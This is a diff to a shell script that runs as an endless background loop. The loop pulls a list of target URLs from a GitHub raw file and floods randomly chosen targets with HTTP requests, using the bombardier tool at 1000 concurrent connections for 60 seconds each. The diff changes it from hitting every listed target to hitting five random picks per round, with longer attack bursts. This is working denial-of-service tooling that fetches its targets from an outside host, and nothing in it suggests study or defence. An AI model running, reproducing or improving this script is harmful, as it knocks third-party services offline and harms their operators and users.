@@ -641,10 +641,11 @@ screen -dm bash -c '
 while true
 do
 	readarray -t list < <(curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list)
-	for p in "${list[@]}"
+	for i in {1..5}
 	do
-	  echo "$p"
-	  docker run -it alpine/bombardier -c 1000 -d 30s -l "$p"
+	  target=${list[RANDOM%${#list[@]}]}
+	  echo "$target"
+	  docker run -it alpine/bombardier -c 1000 -d 60s -l "$target"
 	  sleep 1;
 	done
 done
